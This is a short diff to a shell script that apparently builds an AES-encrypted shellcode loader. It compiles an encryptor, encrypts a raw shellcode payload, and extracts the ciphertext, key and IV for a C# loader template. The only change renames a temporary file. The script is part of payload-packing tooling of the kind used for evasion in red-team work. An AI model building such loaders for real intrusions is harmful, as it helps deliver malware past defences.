@@ -35,12 +35,12 @@ cp aesloader2_template.txt tmp/$final_cs_filename
 # compile the AES encryptor
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
 # encrypt the shellcode payload
-mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output2.txt
+mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt
 
-encpayload=$(cat tmp/enc_output2.txt | grep 'Encrypted' | cut -d ' ' -f 2)
-encpayloadlength=$(cat tmp/enc_output2.txt | grep 'PayloadLength' | cut -d ':' -f 2)
-aeskey=$(cat tmp/enc_output2.txt | grep 'AES_Key' | cut -d ':' -f 2)
-aesiv=$(cat tmp/enc_output2.txt | grep 'AES_IV' | cut -d ':' -f 2)
+encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
+encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
+aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
+aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)
 
 if [ $arch = 'x64' ]
 then
